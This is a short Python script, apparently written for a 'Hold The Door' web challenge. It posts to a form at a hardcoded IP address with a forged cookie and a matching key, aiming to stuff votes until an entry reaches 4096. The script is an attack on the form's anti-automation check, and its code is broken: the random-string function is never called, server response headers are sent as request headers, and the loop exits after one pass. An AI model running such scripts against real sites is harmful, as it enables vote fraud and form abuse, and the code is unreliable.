#!/usr/bin/python3
"""
function to continually add input to form
uses requests:
helper variables: r.url, r.status_code, r.headers, r.text
"""
import requests, time, random, string

url = 'http://54.221.6.249/level1.php'

def getheaders(arandomstring):
    headers = {
        'vary': 'Accept-Encoding',
        'content-encoding': 'gzip',
        'x-powered-by': 'PHP/5.5.9-1ubuntu4.20',
        'content-type': 'application/x-www-form-urlencoded',
        'server': 'Apache/2.4.7 (Ubuntu)',
        'set-cookie': ''
    }
    headers['set-cookie'] = 'HoldTheDoor=' + str(arandomstring) + '; expires=Wed, 10-May-2017 23:19:13 GMT; Max-Age=3600'
    return headers

def getdata(arandomstring):
    data = {
        'id': '123',
        'holdthedoor': 'submit',
        'key': ''
    }
    data['key'] = '{:}'.format(arandomstring)
    return data

mission = "<td>\n123    </td>\n    <td>\n4096    </td>"

def getstring():
    return ''.join([random.choice(string.ascii_lowercase + string.digits) for n in range(40)])

while True:
    arandomstring = getstring
    data = getdata(arandomstring)
    headers = getheaders(arandomstring)
    r = requests.post(url, data=data, headers=headers)
    print(data['key'],
          headers['set-cookie'],
          r.url,
          r.status_code,
          r.headers,
          r.text,
          sep='\n\n\n')
    break
#    if mission in r.text:
#        break
#    time.sleep(1)
